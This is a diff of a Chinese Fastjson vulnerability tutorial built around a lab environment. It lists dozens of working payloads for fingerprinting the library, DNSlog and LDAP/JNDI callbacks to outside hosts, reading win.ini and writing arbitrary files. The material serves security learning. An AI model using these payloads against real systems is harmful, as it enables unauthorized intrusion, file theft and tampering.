@@ -30,7 +30,7 @@ https://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement
 我这里大部分直接使用`safe6Sec`师傅制作的复现环境（如果需要使用其他的靶场我会单独说明）：
 
 ```
-git clone https://github.com/safe6Sec/ShiroAndFastJson.git
+git clone https://github.com/safe6Sec/ShiroAndFastJson.git
 
 
 ```
@@ -40,16 +40,16 @@ git clone https://github.com/safe6Sec/ShiroAndFastJson.git
 ```
 @PostMapping("/json")
 @ResponseBody
-public JSONObject parse(@RequestBody String data) {
-    JSONObject jsonObject = new JSONObject();
-    try {
-        jsonObject.put("status", 0);
-        jsonObject.put("message", String.valueOf(JSON.parse(data)));
-    } catch (Exception e) {
-        jsonObject.put("status", -1);
-        jsonObject.put("error", e.getMessage());
-    }
-    return jsonObject;
+public JSONObject parse(@RequestBody String data) {
+    JSONObject jsonObject = new JSONObject();
+    try {
+        jsonObject.put("status", 0);
+        jsonObject.put("message", String.valueOf(JSON.parse(data)));
+    } catch (Exception e) {
+        jsonObject.put("status", -1);
+        jsonObject.put("error", e.getMessage());
+    }
+    return jsonObject;
 }
 
 
@@ -98,7 +98,7 @@ public JSONObject parse(@RequestBody String data) {
 如果解析成功，那么说明目标使用的是`fastjson`：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDz93Bfm9NRc1ia7CJHXE1ric1W4ibQic4M1nXVAElSPPxiap2lAstMzqQynA/640?wx_fmt=png)至于这个下面的这个`payload4`，需要根据具体环境参数来修改，不可直接使用：
 
 ```
-{"a":new a(1),"b":x'11',/*\*\/"c":Set[{}{}],"d":"\u0000\x00"}
+{"a":new a(1),"b":x'11',/*\*\/"c":Set[{}{}],"d":"\u0000\x00"}
 
 
 ```
@@ -106,7 +106,7 @@ public JSONObject parse(@RequestBody String data) {
 本意就是如果能对上面的参数的值自动解析，说明使用了`fastjson`组件：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDb5LFFxIDMGw7pXVd5QHPo1jnY5BpuNx7weic5ZXKgKRSTIf6ic2ja2Ww/640?wx_fmt=png)`payload5`：
 
 ```
-{"@type": "whatever"}
+{"@type": "whatever"}
 
 
 ```
@@ -121,7 +121,7 @@ public JSONObject parse(@RequestBody String data) {
 如果对方传入的参数中存在一个`double`类型的（比如说年龄），我们就可以利用这个方法来判断。正常传参：
 
 ```
-{"score": 1}
+{"score": 1}
 
 
 ```
@@ -129,7 +129,7 @@ public JSONObject parse(@RequestBody String data) {
 `payload6`：
 
 ```
-{"score": 1.1111111111111111111111111111111111111111111111111111111111111}
+{"score": 1.1111111111111111111111111111111111111111111111111111111111111}
 
 
 ```
@@ -141,7 +141,7 @@ public JSONObject parse(@RequestBody String data) {
 `payload7`：
 
 ```
-{"age": 1}/*#W01fh4cker
+{"age": 1}/*#W01fh4cker
 
 
 ```
@@ -153,7 +153,7 @@ public JSONObject parse(@RequestBody String data) {
 正常传参：
 
 ```
-{"username": "admin", "password": "admin"}
+{"username": "admin", "password": "admin"}
 
 
 ```
@@ -161,7 +161,7 @@ public JSONObject parse(@RequestBody String data) {
 `payload8`：
 
 ```
-{"username": 'admin', "password": 'admin'}
+{"username": 'admin', "password": 'admin'}
 
 
 ```
@@ -173,7 +173,7 @@ public JSONObject parse(@RequestBody String data) {
 正常传参：
 
 ```
-{"username": "admin", "password": "admin"}
+{"username": "admin", "password": "admin"}
 
 
 ```
@@ -181,7 +181,7 @@ public JSONObject parse(@RequestBody String data) {
 `payload9`：
 
 ```
-{"username": "admin", "password": "admin", "test": 1}
+{"username": "admin", "password": "admin", "test": 1}
 
 
 ```
@@ -189,14 +189,14 @@ public JSONObject parse(@RequestBody String data) {
 如果报错如下，则说明是`jackson`：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDyzicyZHQz5ptQiahhOTZ66CKqIaKC9qSj9PdzBl2ib0ibcm4C7JjemcaZw/640?wx_fmt=png)`fastjson`是不会报错的，这里我们请求`doLogin`路由来验证：
 
 ```
-POST /doLogin?username=admin&password=admin&test=1&rememberme=remember-me HTTP/1.1
-Host: 10.0.47.4:8888
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9
-Cookie: JSESSIONID=8D9951E527FEE008DB7B874D70636D86
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+POST /doLogin?username=admin&password=admin&test=1&rememberme=remember-me HTTP/1.1
+Host: 10.0.47.4:8888
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: JSESSIONID=8D9951E527FEE008DB7B874D70636D86
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
 
 
 ```
@@ -228,7 +228,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36�
 `payload11`：
 
 ```
-{"username": '\r', "password": "admin"}
+{"username": '\r', "password": "admin"}
 
 
 ```
@@ -283,7 +283,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36�
 报错：
 
 ```
-syntax error, expect {, actual EOF
+syntax error, expect {, actual EOF
 
 
 ```
@@ -293,7 +293,7 @@ syntax error, expect {, actual EOF
 报错会显示错误的行数：
 
 ```
-syntax error, expect {, actual EOF, pos 9
+syntax error, expect {, actual EOF, pos 9
 
 
 ```
@@ -303,7 +303,7 @@ syntax error, expect {, actual EOF, pos 9
 报错：
 
 ```
-type not match
+type not match
 
 
 ```
@@ -313,7 +313,7 @@ type not match
 报错（后面接具体的类）：
 
 ```
-type not match. java.lang.AutoCloseable -> org.example.Main$User
+type not match. java.lang.AutoCloseable -> org.example.Main$User
 
 
 ```
@@ -321,7 +321,7 @@ type not match. java.lang.AutoCloseable -> org.example.Main$User
 其中，`fastjson2`以后，都会多一处报错，后面的情况也是一样的：
 
 ```
-Caused by: com.alibaba.fastjson2.JSONException...
+Caused by: com.alibaba.fastjson2.JSONException...
 
 
 ```
@@ -331,7 +331,7 @@ Caused by: com.alibaba.fastjson2.JSONException...
 报错**类似**如下：
 
 ```
-error, offset 35, char 
+error, offset 35, char 
 
 
 ```
@@ -341,7 +341,7 @@ error, offset 35, char 
 报错：
 
 ```
-illegal character 
+illegal character 
 
 
 ```
@@ -351,7 +351,7 @@ illegal character 
 报错内容中会直接显示当前版本的版本号，很方便：
 
 ```
-illegal character , offset 35, character , line 1, column 35, fastjson-version 2.0.8 {"@type":"java.lang.AutoCloseable"
+illegal character , offset 35, character , line 1, column 35, fastjson-version 2.0.8 {"@type":"java.lang.AutoCloseable"
 
 
 ```
@@ -363,7 +363,7 @@ illegal character , offset 35, character , line 1, column 35, fastjso
 报错：
 
 ```
-syntax error, expect {, actual EOF
+syntax error, expect {, actual EOF
 
 
 ```
@@ -373,7 +373,7 @@ syntax error, expect {, actual EOF
 报错类似如下：
 
 ```
-syntax error, expect {, actual EOF, pos 0
+syntax error, expect {, actual EOF, pos 0
 
 
 ```
@@ -383,7 +383,7 @@ syntax error, expect {, actual EOF, pos 0
 报错中都会直接显示版本号：`fastjson1`中显示如下：
 
 ```
-syntax error, expect {, actual EOF, pos 0, fastjson-version 1.2.83
+syntax error, expect {, actual EOF, pos 0, fastjson-version 1.2.83
 
 
 ```
@@ -391,7 +391,7 @@ syntax error, expect {, actual EOF, pos 0, fastjson-version 1.2.83
 `fastjson2`中显示如下：
 
 ```
-Illegal syntax: , offset 34, character  , line 1, column 35, fastjson-version 2.0.40 {"@type":"java.lang.AutoCloseable"
+Illegal syntax: , offset 34, character  , line 1, column 35, fastjson-version 2.0.40 {"@type":"java.lang.AutoCloseable"
 
 
 ```
@@ -438,7 +438,7 @@ Illegal syntax: , offset 34, character  , line 1, column 35, fastjso
 `payload17`：
 
 ```
-{"username":{"@type":"java.net.InetAddress","val":"bjmgclhjrs.dgrh3.cn"}, "password":"admin"}
+{"username":{"@type":"java.net.InetAddress","val":"bjmgclhjrs.dgrh3.cn"}, "password":"admin"}
 
 
 ```
@@ -446,7 +446,7 @@ Illegal syntax: , offset 34, character  , line 1, column 35, fastjso
 需要注意，有时候会报错如下，但是`dnslog`仍然会收到请求，这个是目标服务器的问题，多试就可以了：
 
 ```
-deserialize inet adress error
+deserialize inet adress error
 
 
 ```
@@ -475,7 +475,7 @@ ParserConfig.getGlobalInstance().addAccept("java.io.ByteArrayOutputStream");
 `payload19`：
 
 ```
-{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://tbqnrzguzp.dgrh3.cn"\}\}""}
+{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://tbqnrzguzp.dgrh3.cn"\}\}""}
 
 
 ```
@@ -537,7 +537,7 @@ Set[{"@type":"java.net.URL","val":"http://wobfyhueao.dgrh3.cn"}]
 `payload24`：
 
 ```
-{"zero": {"@type": "com.sun.rowset.JdbcRowSetImpl"\}\}
+{"zero": {"@type": "com.sun.rowset.JdbcRowSetImpl"\}\}
 
 
 ```
@@ -552,7 +552,7 @@ Set[{"@type":"java.net.URL","val":"http://wobfyhueao.dgrh3.cn"}]
 `payload25`：
 
 ```
-{"regex":{"$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"},"blue":"aaa!"}
+{"regex":{"$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"},"blue":"aaa!"}
 
 
 ```
@@ -604,13 +604,13 @@ Set[{"@type":"java.net.URL","val":"http://wobfyhueao.dgrh3.cn"}]
 如果对方用的是`JSON.parseObject`，那么`payload27`还有变种。`payload28`（组合拳）：
 
 ```
-{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://1.2.3.4/POC", "autoCommit":true\}\}""}
+{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://1.2.3.4/POC", "autoCommit":true\}\}""}
 
 
 ```
 
 ```
-{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1/POC", "autoCommit":true\}\}""}
+{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1/POC", "autoCommit":true\}\}""}
 
 
 ```
@@ -665,7 +665,7 @@ Set[{"@type":"java.net.URL","val":"http://wobfyhueao.dgrh3.cn"}]
 `payload31`：
 
 ```
-{"username":{"@type": "java.net.InetSocketAddress"{"address":,"val":"rylxkswlfg.dgrh3.cn"\}\\}\}
+{"username":{"@type": "java.net.InetSocketAddress"{"address":,"val":"rylxkswlfg.dgrh3.cn"\}\\}\}
 
 
 ```
@@ -673,7 +673,7 @@ Set[{"@type":"java.net.URL","val":"http://wobfyhueao.dgrh3.cn"}]
 或者：
 
 ```
-[{"@type": "java.lang.Class","val": "java.io.ByteArrayOutputStream"},{"@type": "java.io.ByteArrayOutputStream"},{"@type": "java.net.InetSocketAddress"{"address":,"val":"rylxkswlfg.dgrh3.cn"\}\}]
+[{"@type": "java.lang.Class","val": "java.io.ByteArrayOutputStream"},{"@type": "java.io.ByteArrayOutputStream"},{"@type": "java.net.InetSocketAddress"{"address":,"val":"rylxkswlfg.dgrh3.cn"\}\}]
 
 
 ```
@@ -685,7 +685,7 @@ Set[{"@type":"java.net.URL","val":"http://wobfyhueao.dgrh3.cn"}]
 `payload32`：
 
 ```
-[{"@type": "java.lang.AutoCloseable","@type": "java.io.ByteArrayOutputStream"},{"@type": "java.io.ByteArrayOutputStream"},{"@type": "java.net.InetSocketAddress"{"address":,"val": "mwhajokbdd.dgrh3.cn"\}\}]
+[{"@type": "java.lang.AutoCloseable","@type": "java.io.ByteArrayOutputStream"},{"@type": "java.io.ByteArrayOutputStream"},{"@type": "java.net.InetSocketAddress"{"address":,"val": "mwhajokbdd.dgrh3.cn"\}\}]
 
 
 ```
@@ -697,7 +697,7 @@ Set[{"@type":"java.net.URL","val":"http://wobfyhueao.dgrh3.cn"}]
 需要准备两个`dnslog`地址，我这里`yakit`上开一个`dnslog.cn`开一个。`payload33`：
 
 ```
-[{"@type": "java.lang.Exception","@type": "com.alibaba.fastjson.JSONException","x": {"@type": "java.net.InetSocketAddress"{"address":,"val": "xfjdbd.dnslog.cn"\}\\}\},{"@type": "java.lang.Exception","@type": "com.alibaba.fastjson.JSONException","message": {"@type": "java.net.InetSocketAddress"{"address":,"val": "uawcowbohf.dgrh3.cn"\}\\}\}]
+[{"@type": "java.lang.Exception","@type": "com.alibaba.fastjson.JSONException","x": {"@type": "java.net.InetSocketAddress"{"address":,"val": "xfjdbd.dnslog.cn"\}\\}\},{"@type": "java.lang.Exception","@type": "com.alibaba.fastjson.JSONException","message": {"@type": "java.net.InetSocketAddress"{"address":,"val": "uawcowbohf.dgrh3.cn"\}\\}\}]
 
 
 ```
@@ -725,7 +725,7 @@ java.net.http.HttpClient
 `payload34`：
 
 ```
-{"z": {"@type": "java.lang.Class","val": "org.springframework.web.bind.annotation.RequestMapping"\}\}
+{"z": {"@type": "java.lang.Class","val": "org.springframework.web.bind.annotation.RequestMapping"\}\}
 
 
 ```
@@ -738,7 +738,7 @@ java.net.http.HttpClient
 `payload35`：
 
 ```
-{"@type":"java.net.Inet4Address","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.lang.String""@type":"java.util.Locale","language":{"@type":"java.lang.String"{1:{"@type":"java.lang.Class","val":"com.mysql.jdbc.Driver"\}\},"country":"aaa.qmc8xj4s.dnslog.pw"\}\\}\}
+{"@type":"java.net.Inet4Address","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.lang.String""@type":"java.util.Locale","language":{"@type":"java.lang.String"{1:{"@type":"java.lang.Class","val":"com.mysql.jdbc.Driver"\}\},"country":"aaa.qmc8xj4s.dnslog.pw"\}\\}\}
 
 
 ```
@@ -751,7 +751,7 @@ java.net.http.HttpClient
 `payload36`：
 
 ```
-{"x": {"@type": "java.lang.Character"{"@type": "java.lang.Class","val": "com.mysql.jdbc.Driver"\}\}
+{"x": {"@type": "java.lang.Character"{"@type": "java.lang.Class","val": "com.mysql.jdbc.Driver"\}\}
 
 
 ```
@@ -772,27 +772,27 @@ java.net.http.HttpClient
 
 ```
 {
-    "@type":"java.lang.Exception",
-    "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
+    "@type":"java.lang.Exception",
+    "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
 }
 
 
 ```
 
 ```
-{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{ "@type":"java.lang.String""@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException","newAnnotationProcessorUnits":[{}]\}\\}\}
+{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{ "@type":"java.lang.String""@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException","newAnnotationProcessorUnits":[{}]\}\\}\}
 
 
 ```
 
 ```
 {
-    "username":{
-        "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
-        "@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
-        "fileName":"c:/windows/win.ini"
-    },
-    "password":"admin"
+    "username":{
+        "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
+        "@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
+        "fileName":"c:/windows/win.ini"
+    },
+    "password":"admin"
 }
 
 
@@ -825,7 +825,7 @@ java.net.http.HttpClient
 `payload39`：
 
 ```
-[{"@type":"java.lang.Exception","@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"},{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException","newAnnotationProcessorUnits":[{}]\}\\}\},{"username":{"@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit","@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"1.txt"},"password":{"@type":"java.net.Inet4Address","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.lang.String""@type":"java.util.Locale","language":{"@type":"java.lang.String"{"$ref":"$"},"country":"aaa.qmc8xj4s.dnslog.pw"\}\}\}\}]
+[{"@type":"java.lang.Exception","@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"},{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException","newAnnotationProcessorUnits":[{}]\}\\}\},{"username":{"@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit","@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"1.txt"},"password":{"@type":"java.net.Inet4Address","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.lang.String""@type":"java.util.Locale","language":{"@type":"java.lang.String"{"$ref":"$"},"country":"aaa.qmc8xj4s.dnslog.pw"\}\}\}\}]
 
 
 ```
@@ -923,25 +923,25 @@ java.net.http.HttpClient
 
 ```
 {
-  "abc":{"@type": "java.lang.AutoCloseable",
-    "@type": "org.apache.commons.io.input.BOMInputStream",
-    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
-      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
-        "url": "file:///C:/Windows/win.ini"
-      },
-      "charsetName": "UTF-8",
-      "bufferSize": 1024
-    },"boms": [
-      {
-        "@type": "org.apache.commons.io.ByteOrderMark",
-        "charsetName": "UTF-8",
-        "bytes": [
-          59
-        ]
-      }
-    ]
-  },
-  "address" : {"$ref":"$.abc.BOM"}
+  "abc":{"@type": "java.lang.AutoCloseable",
+    "@type": "org.apache.commons.io.input.BOMInputStream",
+    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
+      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
+        "url": "file:///C:/Windows/win.ini"
+      },
+      "charsetName": "UTF-8",
+      "bufferSize": 1024
+    },"boms": [
+      {
+        "@type": "org.apache.commons.io.ByteOrderMark",
+        "charsetName": "UTF-8",
+        "bytes": [
+          59
+        ]
+      }
+    ]
+  },
+  "address" : {"$ref":"$.abc.BOM"}
 }
 
 
@@ -956,38 +956,38 @@ java.net.http.HttpClient
 附上读取文件内容到字节数组的代码：
 
 ```
-import java.io.FileReader;
-import java.io.IOException;
+import java.io.FileReader;
+import java.io.IOException;
 
-public class str2bytes {
-    public static String fileToString(String path) throws IOException {
-        FileReader reader = new FileReader(path);
-        StringBuilder stringBuilder = new StringBuilder();
-        char[] buffer = new char[10];
-        int size;
-        while ((size = reader.read(buffer)) != -1) {
-            stringBuilder.append(buffer, 0, size);
-        }
-        return stringBuilder.toString();
-    }
+public class str2bytes {
+    public static String fileToString(String path) throws IOException {
+        FileReader reader = new FileReader(path);
+        StringBuilder stringBuilder = new StringBuilder();
+        char[] buffer = new char[10];
+        int size;
+        while ((size = reader.read(buffer)) != -1) {
+            stringBuilder.append(buffer, 0, size);
+        }
+        return stringBuilder.toString();
+    }
 
-    public static void main(String[] args) throws IOException {
-        String str = fileToString("C:\\Windows\\win.ini");
-        byte[] byteArray = str.getBytes("UTF-8");
-        boolean first = true;
-        for (byte b : byteArray) {
-            int intValue = b & 0xFF;
-            if (first) {
-                System.out.print(intValue);
-                first = false;
-            } else {
-                System.out.print(", " + intValue);
-            }
-        }
-    }
+    public static void main(String[] args) throws IOException {
+        String str = fileToString("C:\\Windows\\win.ini");
+        byte[] byteArray = str.getBytes("UTF-8");
+        boolean first = true;
+        for (byte b : byteArray) {
+            int intValue = b & 0xFF;
+            if (first) {
+                System.out.print(intValue);
+                first = false;
+            } else {
+                System.out.print(", " + intValue);
+            }
+        }
+    }
 }
 
-//59, 32, 102, 111, 114, 32, 49, 54, 45, 98, 105, 116, 32, 97, 112, 112, 32, 115, 117, 112, 112, 111, 114, 116, 13, 10, 91, 102, 111, 110, 116, 115, 93, 13, 10, 91, 101, 120, 116, 101, 110, 115, 105, 111, 110, 115, 93, 13, 10, 91, 109, 99, 105, 32, 101, 120, 116, 101, 110, 115, 105, 111, 110, 115, 93, 13, 10, 91, 102, 105, 108, 101, 115, 93, 13, 10, 91, 77, 97, 105, 108, 93, 13, 10, 77, 65, 80, 73, 61, 49, 13, 10
+//59, 32, 102, 111, 114, 32, 49, 54, 45, 98, 105, 116, 32, 97, 112, 112, 32, 115, 117, 112, 112, 111, 114, 116, 13, 10, 91, 102, 111, 110, 116, 115, 93, 13, 10, 91, 101, 120, 116, 101, 110, 115, 105, 111, 110, 115, 93, 13, 10, 91, 109, 99, 105, 32, 101, 120, 116, 101, 110, 115, 105, 111, 110, 115, 93, 13, 10, 91, 102, 105, 108, 101, 115, 93, 13, 10, 91, 77, 97, 105, 108, 93, 13, 10, 77, 65, 80, 73, 61, 49, 13, 10
 
 
 ```
@@ -1034,23 +1034,23 @@ public class str2bytes {
 
 ```
 {
-    "x":{
-        "@type":"java.lang.AutoCloseable",
-        "@type":"sun.rmi.server.MarshalOutputStream",
-        "out":{
-            "@type":"java.util.zip.InflaterOutputStream",
-            "out":{
-                "@type":"java.io.FileOutputStream",
-                "file":"C:/Users/whoami/Desktop/testtesttest.txt",
-                "append":false
-            },
-            "infl":{
-                "input":"SGVsbG8sIFcwMWZoNGNrZXIh"
-            },
-            "bufLen":1048576
-        },
-        "protocolVersion":1
-    }
+    "x":{
+        "@type":"java.lang.AutoCloseable",
+        "@type":"sun.rmi.server.MarshalOutputStream",
+        "out":{
+            "@type":"java.util.zip.InflaterOutputStream",
+            "out":{
+                "@type":"java.io.FileOutputStream",
+                "file":"C:/Users/whoami/Desktop/testtesttest.txt",
+                "append":false
+            },
+            "infl":{
+                "input":"SGVsbG8sIFcwMWZoNGNrZXIh"
+            },
+            "bufLen":1048576
+        },
+        "protocolVersion":1
+    }
 }
 
 
